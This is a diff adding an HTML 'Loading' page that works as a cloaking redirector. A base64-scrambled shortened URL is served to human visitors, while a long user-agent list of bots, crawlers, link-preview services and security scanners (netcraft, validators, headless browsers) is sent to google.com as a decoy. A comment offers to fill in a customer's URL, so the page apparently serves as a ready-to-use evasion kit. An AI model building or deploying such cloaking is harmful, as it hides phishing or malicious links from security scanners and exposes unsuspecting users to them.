@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading</title>
+<script>
+// ==========================================================
+//   >>>>   EDIT HERE   <<<<
+//   REAL_PAGE : your page address, scrambled (base64).
+//               Send me your URL and I will fill this in.
+//   DECOY     : where bots/scanners get sent instead.
+//               Keep it a well-known trusted site.
+// ==========================================================
+var REAL_PAGE = "aHR0cHM6Ly90aW55dXJsLmNvbS8zeWhiNDd0OA==";
+var DECOY     = "https://www.google.com";
+// ==========================================================
+
+var ua = (navigator.userAgent || "").toLowerCase();
+var bots = [
+  "bot","crawler","spider","crawl","slurp","curl","wget","python",
+  "java","headless","phantomjs","selenium","puppeteer","playwright",
+  "jsdom","facebookexternalhit","twitterbot","whatsapp","telegram",
+  "discordbot","slackbot","vkshare","pinterest","lighthouse","pingdom",
+  "gtmetrix","semrush","ahrefs","mj12","dotbot","applebot","uptimerobot",
+  "site24x7","speedvisor","browserlab","checkbot","baiduspider","yandex",
+  "duckduckbot","exabot","petalbot","quantum","archive","webarchiver",
+  "netcraft","w3c","validator","gstatic","sogou","seznam","feedfetcher",
+  "msnbot","quora"
+];
+var isBot = false;
+for (var i = 0; i < bots.length; i++) {
+  if (ua.indexOf(bots[i]) !== -1) { isBot = true; break; }
+}
+if (window.navigator.webdriver === true) { isBot = true; }
+
+location.replace(isBot ? DECOY : atob(REAL_PAGE));
+</script>
+</head>
+<body></body>
+</html>
